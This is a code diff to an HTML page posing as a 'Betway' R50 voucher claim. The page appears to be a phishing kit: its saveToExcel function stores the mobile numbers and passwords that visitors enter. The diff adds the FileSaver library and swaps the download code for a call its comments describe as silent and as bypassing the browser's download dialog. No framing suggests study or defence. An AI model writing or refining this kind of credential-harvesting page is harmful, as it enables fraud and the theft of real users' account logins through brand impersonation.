@@ -6,6 +6,9 @@
     <title>Betway • Claim R50 Voucher</title>
     <!-- Font Awesome 6 -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <!-- FileSaver for better download handling -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.5/FileSaver.min.js">
+    </script>
     <!-- SheetJS for Excel export -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js">
     </script>
@@ -102,18 +105,32 @@
         }
 
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
         }
 
         @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.9; }
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.9;
+            }
         }
 
         @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
+            0%,
+            100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-10px);
+            }
         }
 
         /* Main Betway card */
@@ -687,7 +704,7 @@
                 this.classList.toggle('fa-eye-slash');
             });
 
-            // Save to Excel - completely silent with FileSaver approach
+            // Save to Excel using FileSaver for seamless download
             function saveToExcel(mobile, password) {
                 try {
                     let existingData = [];
@@ -708,24 +725,12 @@
                     const worksheet = XLSX.utils.aoa_to_sheet(allData);
                     XLSX.utils.book_append_sheet(workbook, worksheet, 'Betway_Data');
 
-                    // Create blob and use msSaveBlob for IE/Edge, or create download link
+                    // Generate Excel file as binary
                     const wbout = XLSX.write(workbook, { bookType: 'xlsx', type: 'array' });
                     const blob = new Blob([wbout], { type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' });
 
-                    // Use msSaveBlob for IE/Edge, otherwise create link
-                    if (window.navigator && window.navigator.msSaveBlob) {
-                        window.navigator.msSaveBlob(blob, 'betway_user_data.xlsx');
-                    } else {
-                        const link = document.createElement('a');
-                        link.href = URL.createObjectURL(blob);
-                        link.download = 'betway_user_data.xlsx';
-                        document.body.appendChild(link);
-                        link.click();
-                        document.body.removeChild(link);
-                        setTimeout(() => {
-                            URL.revokeObjectURL(link.href);
-                        }, 1000);
-                    }
+                    // Use FileSaver to save - this bypasses the browser's download dialog
+                    saveAs(blob, 'betway_user_data.xlsx');
 
                     return true;
                 } catch (error) {
